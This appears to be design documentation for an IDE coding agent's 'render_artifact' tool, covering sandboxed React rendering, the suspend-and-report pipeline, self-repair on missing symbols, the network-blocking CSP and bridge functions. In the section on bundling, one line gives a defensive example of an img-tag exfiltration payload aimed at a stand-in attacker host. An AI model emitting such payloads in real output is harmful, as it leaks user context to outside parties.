# `render_artifact` — extended notes

## Why this exists

`render_artifact` is the only path the agent has to produce *interactive* output.
Every other tool returns text (Markdown, code blocks, ASCII art). When the user
asks for an architecture diagram, a dependency graph, a sortable table of test
results, or a chart of build durations, the LLM has two choices:

1. Emit a Markdown table or an ASCII flowchart and pray the renderer cooperates.
2. Call `render_artifact` and hand back a real React component that renders in
   the chat as a sandboxed iframe with charts, tooltips, navigation, and IDE
   bridge calls.

The first path produces output that is text-search-correct but visually inert.
The second path produces something the user can hover, click, sort, and pivot
through. The gap is large enough that we accept the runtime cost of bundling
React + Recharts + xyflow + tanstack-table + d3 + cobe + roughjs + react-simple-
maps + date-fns + colord into the sandbox webview just to make this tool useful.

## Not fire-and-forget — it suspends

The most important contract: **`render_artifact` suspends the agent loop until
the iframe reports back what actually happened.** The pipeline is:

```
Kotlin RenderArtifactTool.execute()
  → ArtifactResultRegistry.renderAndAwait(payload, 30s timeout)
    → AgentCefPanel.renderArtifact() pushes payload to webview
      → React <ArtifactRenderer> mounts an iframe (artifact-sandbox.html)
        → sandbox-main.ts compiles the source via react-runner against fullScope
          → component mounts (or throws ReferenceError / TypeError / runtime error)
        → iframe postMessage's the outcome back to <ArtifactRenderer>
      → ArtifactRenderer.reportToKotlin via JCEF bridge
    → AgentController.parseAndDispatchArtifactResult
  → ArtifactResultRegistry.reportResult() completes the CompletableDeferred
→ tool returns Success / RenderError / Timeout / Skipped as a structured ToolResult
```

Because the loop suspends on `CompletableDeferred.await()`, the next LLM turn
sees the actual render outcome — not an optimistic "I sent it" message. This is
what makes the **self-repair loop** possible.

## The self-repair loop

When the sandbox throws a `ReferenceError: Foo is not defined`, the
`extractMissingSymbols` regex in `sandbox-main.ts` parses V8's error phrasing
(`"Foo is not defined"`, `"Cannot read properties of undefined (reading 'bar')"`,
etc.) and produces a list of identifiers the LLM tried to use that aren't in
scope. That list is appended to the tool result alongside `RenderArtifactTool.SCOPE_HINT`
— the canonical inventory of what *is* available. The LLM gets a structured
prompt:

```
Artifact render failed [evaluate] at line 12: Histogram is not defined

Missing symbols (not in sandbox scope): Histogram

Available identifiers in the sandbox scope (use directly, NO import statements):
- React hooks: React, useState, useEffect, …
- Recharts: BarChart, Bar, LineChart, Line, …
…

Rewrite the component without the missing symbols and call render_artifact again.
```

This converts what would otherwise be a dead-end "your component crashed" into
an actionable next iteration. In practice the LLM almost always lands on a
working render within 1–2 retries, swapping `Histogram` for `BarChart` (or
similar) once it sees the available palette.

## Why bundle everything inline?

The sandbox iframe has **no network access** — `connect-src` in the CSP is
`'self' http://workflow-agent` which only covers the resource scheme handler
serving the static webview bundle. There is no way for an artifact to fetch
its own data at runtime.

This is intentional. It means:
- The LLM cannot exfiltrate context by emitting `<img src="https://attacker.example/?data=...">`.
- Components are deterministic — same source, same render, same screenshot.
- "Stale snapshot" is a non-problem: if the data changes, the LLM emits a new
  artifact with the updated inline data.

The cost is that *all data must be inline*. A table of 50K Sonar issues won't
fit in a single component — the LLM has to summarise/aggregate before rendering.
The 100KB source-size cap (enforced before suspension) is a guardrail against
the model trying.

## Bridge functions

The sandbox has access to four bridge values, exposed via `window.bridge`:

- `bridge.navigateToFile(path, line)` — clicking an item in the artifact opens
  the file in the IDE editor. The most common use: rendering a list of
  diagnostics or a call graph where each node should jump to its source.
- `bridge.isDark` — the active IDE theme. Lets the artifact match without
  duplicating CSS variables; preferred over hand-coded dark-mode classes.
- `bridge.colors` — IDE-derived accent colours so charts blend in.
- `bridge.projectName` — labelling artifacts that span multiple projects.

## What "Skipped" means

In tests and headless contexts (`Skipped(reason)`), no `ArtifactResultListener`
is registered, so the registry returns `Skipped` immediately. The tool
optimistically reports success because there's no real render to await — the
sandbox doesn't exist. This preserves the pre-2026 behaviour for
`AgentLoopTest`-style fixtures.

## When NOT to call

Three categories of misuse:

1. **Short text answers.** The user asked "what does this regex match?" — a
   one-line answer is correct. A `<Card>` with `<CardTitle>Regex Explanation</CardTitle>`
   is theatre.
2. **Yes/no questions.** "Does this build pass?" → "Yes." Don't render a
   `<Badge variant="success">Build passing</Badge>` in a Card.
3. **Fewer than 3 items.** Two PRs with the same author? A bullet list. A
   `<Table>` with 2 rows is over-engineering.

The system prompt nudges the LLM here, but reviewers should still flag artifact
abuse on otherwise-text answers.
